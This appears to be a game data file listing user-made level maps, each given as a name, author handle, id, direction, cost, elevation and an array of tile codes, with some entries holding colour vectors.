maps.push({name="Right For Items",author="FroZRil",id="#1741229451",direction="right",cost=271,elevation=0,map=[0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,24,24,0,0,0,1,1,1,0,0,1,99,1,0,0,0,0,0,0,0,24,24,0,0,1,93,24,94,1,0,1,24,1,0,0,0,0,0,1,1,24,24,1,1,24,24,24,24,98,1,24,24,1,0,0,0,0,1,131,24,24,24,96,24,24,24,24,98,136,199,24,24,2,0,0,0,0,1,131,24,24,24,96,24,24,24,24,98,136,199,24,24,2,0,1,1,0,0,1,1,1,1,1,1,24,24,24,24,98,199,24,24,1,1,132,132,1,0,0,0,0,0,0,0,1,94,24,93,1,1,137,137,1,1,24,24,1,0,0,1,1,0,0,0,0,1,1,1,0,0,1,1,0,1,24,24,1,1,1,14,14,1,0,0,0,0,0,0,0,0,0,0,0,1,24,24,96,24,14,66,66,133,1,0,0,0,1,1,1,1,1,1,0,1,97,24,96,24,14,66,66,14,1,0,0,1,89,14,14,14,14,134,1,0,1,1,1,1,14,66,66,133,1,0,0,1,14,89,14,14,14,134,1,0,0,0,0,0,1,14,14,1,0,0,0,1,14,14,1,1,1,1,0,0,0,0,0,0,0,1,1,0,0,0,0,1,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,76,76,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,136,14,76,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,136,14,76,14,100,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,0,0,0,0,0]});
maps.push({name="Potion Of Awareness",author="FroZRil",id="#1741232196",direction="forward",cost=102,elevation=-19,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,65,65,65,65,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,65,65,65,65,65,65,5,0,0,0,0,0,0,0,0,0,0,0,0,5,65,94,65,65,93,65,5,0,0,0,0,0,0,0,0,0,0,0,0,5,65,65,65,65,65,65,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,65,65,65,65,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,91,0,0,0,0,91,5,0,0,0,0,0,0,0,0,0,0,0,0,90,5,0,0,0,0,5,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,91,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Sidejump Required",author="FroZRil",id="#1741234289",direction="forward",cost=160,elevation=0,map=[0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,14,14,14,14,0,0,5,5,0,0,0,0,0,0,0,5,65,65,5,0,14,14,14,14,0,5,65,65,5,0,0,0,0,0,0,5,65,65,5,0,14,14,14,14,0,5,65,65,5,0,0,0,0,0,0,0,5,5,0,0,132,14,14,134,0,0,5,5,0,0,0,0,0,0,0,0,131,97,0,0,0,96,96,0,0,0,99,133,0,0,0,0,0,0,0,0,0,0,0,0,0,96,96,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,98,98,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,98,98,98,98,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,0,14,14,14,14,0,24,24,24,0,0,0,0,0,0,0,0,24,94,24,0,125,14,14,125,0,24,93,24,0,0,0,0,0,0,0,0,24,24,24,0,14,14,14,14,0,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,14,65,65,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,65,65,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Wide Island",author="FroZRil",id="#1741236023",direction="forward",cost=255,elevation=6,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,6,6,5,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,5,6,6,90,5,0,0,0,0,0,0,11,90,11,0,0,0,0,5,5,6,7,7,6,5,0,0,0,0,0,11,12,12,11,0,0,0,5,6,6,7,8,7,6,5,0,0,0,0,0,11,12,12,94,0,0,0,5,6,7,8,8,90,6,5,0,0,0,0,11,12,13,12,11,0,0,5,6,7,90,9,8,7,6,5,0,0,0,0,11,90,13,12,11,0,5,6,7,8,9,9,8,7,6,5,0,0,0,11,12,132,13,12,90,0,5,6,7,9,89,9,8,7,6,5,0,0,0,11,12,13,13,12,11,93,6,7,90,9,9,8,90,6,5,0,0,0,11,12,13,14,13,134,11,5,6,7,8,9,9,8,7,6,94,0,0,0,11,90,13,14,13,12,11,5,6,7,8,9,9,8,7,6,5,0,0,11,12,13,14,14,13,90,11,5,6,7,90,9,8,90,7,6,5,0,0,11,90,13,14,14,13,12,11,5,6,131,8,8,7,133,6,5,0,0,11,12,12,13,14,89,13,12,11,5,6,7,7,7,6,6,5,0,0,0,11,12,12,13,14,14,13,90,93,0,5,6,6,6,5,5,0,0,0,0,0,11,90,13,13,13,12,11,0,0,0,5,5,5,0,0,0,0,0,0,0,11,12,12,12,12,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0]});
maps.push({name="chaosfacilityad",author="ReBeL",id="#1741274770",direction="forward",cost=823,elevation=0,map=[0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,1,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,14,14,1,1,1,1,1,1,1,1,1,1,1,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,1,1,14,144,144,144,144,144,144,144,14,14,144,144,144,144,144,144,94,14,1,1,14,144,144,144,144,144,144,144,14,14,144,144,144,144,144,144,94,14,1,1,14,144,144,144,144,144,144,144,14,14,144,144,144,144,76,144,144,14,1,1,14,76,144,144,144,144,144,144,14,14,144,144,144,144,144,144,144,14,1,1,14,144,144,144,144,144,144,144,14,14,144,144,144,144,144,144,144,14,1,1,14,144,144,144,144,144,144,144,100,100,144,144,144,144,144,144,144,14,1,1,14,144,144,144,144,144,144,144,100,100,144,144,144,144,144,144,144,14,1,1,14,144,144,144,76,144,144,144,14,14,144,144,144,144,144,144,144,14,1,1,14,144,144,144,144,144,144,144,14,14,144,144,144,144,144,144,144,14,1,1,14,144,144,144,144,144,144,144,14,14,144,144,144,144,144,144,144,14,1,1,14,94,144,144,144,144,144,144,14,14,144,144,144,144,144,144,144,14,1,1,14,94,144,144,144,144,144,144,14,14,144,144,76,76,144,144,144,14,1,1,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,1,1,1,1,1,1,1,1,1,14,14,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Tower of Somering",author="ReBeL",id="#1741279262",direction="forward",cost=318,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,0,0,7,1,1,1,1,1,1,1,7,7,1,1,1,1,1,1,1,7,0,0,7,1,135,135,95,7,7,7,7,7,7,7,7,95,135,135,1,7,0,0,7,1,135,0,0,0,1,1,1,1,1,1,0,0,0,135,1,7,0,0,7,1,135,0,0,0,0,0,0,0,0,0,0,0,0,135,1,7,0,0,7,1,135,0,0,12,1,12,0,0,12,1,12,0,0,135,1,7,0,7,7,1,7,0,0,0,1,0,0,0,0,1,0,0,0,7,1,7,7,7,7,1,95,0,12,0,1,0,0,0,0,1,0,12,0,95,1,7,7,98,98,1,0,0,12,0,1,0,93,11,0,1,0,12,0,0,1,98,98,98,98,1,3,0,12,0,1,0,11,93,0,1,0,12,0,3,1,98,98,98,98,1,12,0,3,0,1,0,12,12,0,1,0,3,0,12,1,98,98,7,7,1,3,0,0,0,1,0,99,99,0,1,0,0,0,3,1,7,7,7,7,1,0,0,0,0,1,1,98,98,1,1,0,0,0,0,1,7,7,7,7,1,7,7,7,0,0,3,32,32,3,0,0,7,7,7,1,7,7,0,7,1,7,7,7,7,0,0,32,32,0,0,7,7,7,7,1,7,0,0,7,1,7,7,7,7,0,0,98,98,0,0,7,7,7,7,1,7,0,0,7,1,1,1,1,1,1,1,98,98,1,1,1,1,1,1,1,7,0,0,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="the thinker thonk",author="ReBeL",id="#1741284663",direction="forward",cost=251,elevation=0,map=[0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,132,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,127,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,24,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,24,0,183,183,183,183,183,183,14,14,183,183,183,183,183,183,0,0,0,0,127,0,183,1,0,0,0,0,14,14,0,0,0,0,1,183,0,0,0,0,24,0,15,1,0,0,0,0,14,14,0,0,0,0,1,13,0,0,0,0,24,0,16,1,199,199,199,199,199,199,199,199,199,199,1,12,134,0,0,0,24,0,17,1,199,199,199,199,199,199,199,199,199,199,1,11,0,0,0,0,24,0,18,1,199,199,199,199,199,199,199,199,199,199,1,10,0,0,0,0,127,0,19,1,199,199,199,199,199,199,199,199,199,199,1,9,0,0,0,0,24,0,20,1,0,0,0,0,14,14,0,0,0,0,1,8,0,0,1,0,24,0,21,1,0,0,0,0,14,14,0,0,0,0,1,7,0,0,1,0,24,0,183,183,183,183,183,183,184,184,183,0,0,0,0,6,183,131,1,0,127,0,183,0,0,0,0,0,14,14,5,5,5,5,0,0,0,0,1,0,24,0,183,0,0,0,0,0,14,14,3,5,5,5,0,0,0,0,1,0,24,0,183,0,0,0,0,65,14,14,3,5,5,65,0,0,1,1,1,0,127,183,183,0,0,0,0,65,14,14,5,5,5,65,0,0,24,24,24,24,132,94,183,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,93,24,94,183,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,93,24]});
maps.push({name="Donkey Kong",author="GS Bany",id="#1741294751",direction="left",cost=249,elevation=19,map=[0,0,0,22,0,0,19,0,0,14,0,0,11,0,2,2,5,0,0,0,0,0,0,174,0,0,175,0,0,178,0,0,179,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,21,21,21,18,18,18,13,13,13,10,10,10,5,5,5,0,0,0,0,0,21,21,21,18,18,18,13,13,13,10,10,10,5,5,5,0,0,0,0,0,21,21,21,3,18,18,13,13,13,3,10,10,5,5,5,0,0,0,0,0,21,21,21,18,18,18,13,13,13,10,10,10,5,5,5,0,0,0,0,0,21,21,21,18,18,18,13,13,13,10,10,10,5,5,5,0,0,0,24,24,3,21,21,18,18,18,13,13,13,10,10,10,5,5,5,0,0,0,2,24,21,21,21,18,18,18,13,13,13,10,10,10,5,5,5,0,0,0,2,24,22,22,22,17,17,17,14,14,14,9,9,9,6,6,6,0,0,0,24,24,22,22,22,17,17,17,14,14,14,9,9,9,6,6,6,0,0,0,0,0,22,22,22,17,17,17,14,14,14,9,9,9,6,6,6,0,0,0,0,0,22,22,22,17,17,17,14,14,14,9,9,9,6,6,6,0,0,0,0,0,22,94,22,17,17,17,3,14,14,9,9,9,3,6,6,0,0,0,0,0,90,90,22,17,17,17,14,14,14,9,9,9,6,6,6,0,0,0,0,0,90,90,22,17,17,17,14,14,14,9,9,9,6,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,172,169,173,0,0,176,0,0,177,0,0,180,0,0,0,0,0,0,0,0,0,93,23,0,0,18,0,0,15,0,0,10,0,0,0,0,0,0,0]});
maps.push({name="A really ugly Tex",author="ReBeL",id="#1741314177",direction="forward",cost=308,elevation=-6,map=[0,0,0,0,0,8,8,8,0,2,2,0,8,0,0,8,0,0,8,8,0,0,0,0,0,8,8,8,0,0,0,0,0,0,0,0,0,0,127,127,0,0,0,0,0,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,8,8,144,144,144,144,144,0,0,0,0,0,0,0,0,0,0,8,8,8,8,8,144,144,144,144,94,0,0,0,0,0,0,0,0,0,0,8,8,8,8,8,144,144,144,144,94,0,0,0,0,0,0,0,0,0,0,8,8,8,1,1,1,1,1,1,1,0,0,0,13,13,0,0,0,8,8,8,8,8,8,8,8,76,76,8,8,0,0,0,13,13,0,0,0,8,8,8,8,8,8,8,8,76,76,8,8,0,0,1,13,13,0,0,0,76,76,1,1,1,8,8,1,1,1,76,76,0,0,1,93,131,0,0,0,76,76,1,1,1,8,8,1,1,1,8,8,0,0,1,1,1,8,8,8,8,8,1,1,1,8,8,1,1,1,8,8,8,8,8,0,0,96,96,96,96,96,1,1,1,8,8,1,1,1,96,96,96,96,96,0,0,0,0,0,8,8,1,1,1,97,8,1,1,1,8,8,8,0,0,0,0,0,0,0,1,8,8,1,1,1,1,1,1,8,8,8,0,0,0,0,0,0,0,0,1,1,8,8,8,8,8,8,8,8,0,0,0,0,0,0,0,0,0,0,1,1,1,1,8,8,8,8,8,0,0,0,0,0,0,0,0,0,0,0,1,8,8,8,0,0,0,0,0,8,8,8,0,0,0,0,0,132,8,8,8,0,0,0,0,8,8,8,0,0,0,0,8,8,0,0,0,0,0,0,0,0,0,0,0,8,2,2,8,8,0,0,8,8,0,0,0]});
maps.push({name="Attention to Detail",author="Mini",id="#1741354449",direction="forward",cost=184,elevation=0,map=[0,0,0,19,19,19,19,19,19,2,2,19,19,19,19,19,19,0,0,0,0,0,0,0,19,19,19,19,19,19,19,19,19,19,19,19,0,0,0,0,0,0,0,0,0,19,19,19,19,19,19,19,19,19,19,0,0,0,0,0,0,0,0,0,189,0,0,0,19,19,19,19,0,0,0,189,0,0,0,0,0,0,0,0,7,0,1,0,0,0,0,0,0,1,0,7,0,0,0,0,0,0,0,0,183,0,1,39,39,39,39,39,39,1,0,183,0,0,0,0,0,0,0,0,183,0,1,39,39,39,39,39,39,1,0,183,0,0,0,0,0,0,0,0,183,0,1,0,0,0,0,0,0,1,0,183,0,0,0,0,0,0,0,0,183,0,1,39,39,39,39,39,39,1,0,183,0,0,0,0,0,0,0,0,183,0,1,39,39,39,39,39,39,1,0,183,0,0,0,0,0,0,0,0,183,0,1,0,0,0,0,0,0,1,0,183,0,0,0,0,0,0,0,0,183,0,1,39,39,39,39,39,39,1,0,183,0,0,0,0,0,0,0,0,183,0,1,39,39,39,39,39,39,1,0,183,0,0,0,0,0,0,0,0,183,0,1,0,0,0,0,0,0,1,0,183,0,0,0,0,0,0,0,131,183,0,1,39,39,39,39,39,39,1,0,183,131,0,0,0,0,0,0,7,7,0,1,39,39,39,39,39,39,1,0,7,7,0,0,0,0,0,0,188,188,0,1,0,0,0,0,0,0,1,0,188,188,0,0,0,0,0,0,44,44,44,0,19,19,19,19,19,19,0,44,44,44,0,0,0,0,0,0,93,132,44,0,19,19,19,19,19,19,0,44,132,93,0,0,0,0,0,0,44,44,44,0,19,19,2,2,19,19,0,44,44,44,0,0,0]});
maps.push({name="Three Times Up",author="FroZRil",id="#1741355976",direction="forward",cost=339,elevation=19,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,5,5,1,1,1,0,0,0,1,19,19,19,19,19,19,14,14,14,5,5,5,5,5,5,1,0,0,0,1,19,66,66,19,19,19,14,14,14,5,5,5,5,5,5,1,0,0,0,1,19,66,66,19,19,19,152,14,14,5,5,5,5,5,5,1,0,0,0,1,19,66,66,19,19,19,14,14,14,5,5,152,5,5,5,1,0,0,0,1,19,66,66,19,19,19,14,14,85,14,14,14,14,14,14,1,0,0,0,1,19,66,66,19,90,19,14,85,14,14,14,14,14,14,14,1,0,0,0,1,19,66,66,19,19,19,85,14,14,14,14,14,14,14,14,1,0,0,0,1,19,66,66,19,19,19,19,19,19,19,19,19,19,19,19,1,0,0,0,1,19,66,66,19,19,19,19,19,19,19,90,19,19,19,19,1,0,0,0,1,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,1,0,0,0,1,24,24,24,24,24,24,24,24,19,19,19,19,89,19,19,1,0,0,0,1,24,90,24,24,24,24,24,24,19,19,19,93,19,93,19,1,0,0,0,1,24,24,24,24,24,24,24,24,152,19,89,19,89,19,89,1,0,0,0,1,24,24,24,24,24,24,24,24,19,19,19,94,19,94,19,1,0,0,0,1,24,24,24,24,24,90,24,24,19,19,19,19,89,19,19,1,0,0,0,1,24,24,24,24,24,24,24,24,19,19,19,19,19,19,19,1,0,0,0,1,1,24,24,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="RACE Cross The Pit",author="Mini",id="#1741356056",direction="forward",cost=188,elevation=13,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,17,17,18,18,19,19,0,0,0,0,0,0,5,5,5,5,0,0,0,17,17,17,18,18,19,19,19,0,0,0,0,0,5,5,5,5,0,0,0,17,17,17,18,18,19,19,19,19,0,0,0,0,5,5,5,5,0,0,0,17,17,17,18,18,19,19,19,19,0,0,0,0,6,6,6,6,0,0,0,16,16,16,0,0,20,20,20,20,0,0,0,0,6,6,6,6,0,0,0,16,16,16,0,0,20,20,20,20,0,0,0,0,6,6,6,6,0,0,0,15,15,15,0,0,21,21,21,21,0,0,0,0,7,7,7,7,0,0,0,15,15,15,0,0,21,21,21,21,0,0,0,0,7,7,7,7,0,0,0,14,14,14,14,13,21,21,21,21,11,10,10,9,8,8,8,8,0,0,0,14,14,14,14,13,13,12,12,11,11,10,10,9,8,8,8,8,0,0,0,14,14,14,14,13,13,12,12,11,11,10,10,9,8,8,8,0,0,0,0,0,14,14,14,13,17,17,17,17,11,10,10,9,8,8,0,0,0,0,0,0,0,0,0,0,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,2,2,18,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Predator Ultimate",author="Mini",id="#1741357159",direction="forward",cost=82,elevation=0,map=[0,0,0,0,0,0,0,0,32,2,2,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,32,32,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,174,175,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,0,171,189,0,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,168,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,0,173,176,0,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,32,32,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,32,32,32,32,32,0,0,0,0,0,0,0,0,0,0,0,0,0,32,32,32,14,16,32,32,32,0,0,0,0,0,0,0,0,0,0,0,32,32,32,44,100,44,18,32,32,32,0,0,0,0,0,0,0,0,0,0,0,32,32,32,22,20,32,32,32,0,0,0,0,0,0,0,0,0,0,0,0,0,32,32,32,32,32,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,32,32,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,183,183,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,183,183,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,183,183,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,183,183,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,2,2,12,0,0,0,0,0,0,0,0]});
maps.push({name="RACE Rainbow Road",author="Mini",id="#1741358900",direction="forward",cost=137,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,2,2,5,5,0,0,0,0,0,0,0,0,0,0,0,29,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,29,Vector(221,0,0),0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,145,29,Vector(254,98,48),0,0,5,5,5,0,0,0,Vector(48,0,155),0,0,0,0,0,0,0,0,29,Vector(254,246,0),0,0,5,5,5,0,0,0,Vector(0,0,131),29,0,0,0,0,0,0,145,29,Vector(0,187,0),0,0,5,5,5,5,0,0,Vector(0,155,254),29,145,0,0,0,0,0,0,29,Vector(0,155,254),0,0,5,5,5,5,0,0,Vector(0,187,0),29,145,0,0,0,0,0,145,29,Vector(0,0,131),0,0,5,5,5,5,0,0,Vector(254,246,0),29,145,0,0,0,0,0,0,0,Vector(48,0,155),0,0,5,5,5,5,0,0,Vector(254,98,48),29,145,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,Vector(221,0,0),29,186,0,0,0,0,0,0,0,0,187,29,Vector(221,0,0),0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,145,29,Vector(254,98,48),0,0,5,5,5,5,0,0,Vector(48,0,155),0,0,0,0,0,0,0,145,29,Vector(254,246,0),0,0,5,5,5,5,0,0,Vector(0,0,131),29,145,0,0,0,0,0,145,29,Vector(0,187,0),0,0,5,5,5,5,0,0,Vector(0,155,254),29,0,0,0,0,0,0,145,29,Vector(0,155,254),0,0,5,5,5,5,0,0,Vector(0,187,0),29,145,0,0,0,0,0,0,29,Vector(0,0,131),0,0,0,5,5,5,0,0,Vector(254,246,0),29,0,0,0,0,0,0,0,0,Vector(48,0,155),0,0,0,5,5,5,0,0,Vector(254,98,48),29,145,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,Vector(221,0,0),29,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,145,0,0,0,0,0,0,0,0,0,0,0,5,5,2,2,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Choices",author="Mini",id="#1741359763",direction="forward",cost=126,elevation=0,map=[0,0,0,0,0,0,0,0,11,2,2,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,51,51,51,0,0,0,0,0,0,0,0,0,0,0,0,0,51,51,0,0,0,11,86,11,0,0,0,0,0,0,0,0,0,0,0,11,11,11,0,0,0,0,51,51,51,0,0,0,0,0,0,0,0,0,91,91,91,0,0,0,0,0,0,11,11,11,11,0,0,0,0,0,11,91,11,91,91,0,0,0,0,0,0,0,0,51,51,51,0,0,0,0,11,91,91,91,0,0,0,0,0,0,0,0,0,0,11,11,88,0,0,0,0,0,0,0,0,0,0,0,0,0,0,51,94,0,0,51,51,51,0,0,0,0,0,0,0,0,0,0,0,0,0,94,51,0,0,51,51,51,0,0,11,91,91,91,0,0,0,0,0,0,0,0,0,0,11,11,88,0,0,0,11,91,11,91,91,0,0,0,0,0,0,0,0,51,51,51,0,0,0,0,0,0,91,91,91,0,0,0,0,0,0,11,11,11,11,0,0,0,0,0,0,0,0,11,11,11,0,0,0,0,51,51,51,0,0,0,0,0,0,0,0,0,0,0,51,51,0,0,0,11,86,11,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,51,51,51,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,2,2,11,0,0,0,0,0,0,0,0]});
maps.push({name="RACE Bumps",author="Mini",id="#1741360666",direction="right",cost=121,elevation=-8,map=[0,0,0,40,2,2,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,40,0,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,40,40,40,40,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,40,40,40,40,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,40,40,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,40,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,40,40,40,40,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,35,35,35,35,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,36,36,36,36,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,36,36,36,36,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,36,36,36,36,36,36,36,36,0,0,31,32,32,32,32,32,32,0,0,0,36,36,36,36,36,36,36,36,0,0,31,32,32,32,32,32,2,0,0,0,36,36,36,36,36,36,36,36,0,0,31,32,32,32,32,32,2,0,0,0,36,36,36,36,36,36,36,36,0,0,31,32,32,32,32,32,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="All The Way Under",author="FroZRil",id="#1741361027",direction="forward",cost=217,elevation=-19,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,124,124,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,124,124,124,124,124,124,124,124,124,1,0,0,0,0,0,0,0,0,0,1,124,124,124,93,94,124,124,124,124,1,0,0,0,0,0,0,0,0,0,1,124,124,1,1,1,1,1,124,124,1,0,0,0,0,0,0,0,0,0,1,124,124,143,124,124,124,143,124,124,1,0,0,0,0,0,0,0,0,0,1,124,124,143,124,124,124,143,124,124,1,0,0,0,0,0,0,0,0,0,1,90,124,1,123,123,123,1,124,90,1,0,0,0,0,0,0,0,0,0,1,1,1,1,122,122,122,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,121,121,121,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,120,120,120,1,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,119,119,119,1,0,0,0,0,0,0,0,0,1,90,115,115,115,116,117,118,119,119,119,1,0,0,0,0,0,0,0,0,1,115,115,115,115,116,117,118,119,119,119,1,0,0,0,0,0,0,0,0,1,115,115,115,115,116,117,118,119,119,90,1,0,0,0,0,0,0,0,0,1,5,152,5,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,1,5,5,5,1,90,105,94,93,105,1,0,0,0,0,0,0,0,0,0,1,105,105,105,1,105,105,105,105,105,1,0,0,0,0,0,0,0,0,0,1,90,105,105,105,105,105,105,105,105,1,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,2,2,1,0,0,0,0,0,0,0,0,0]});
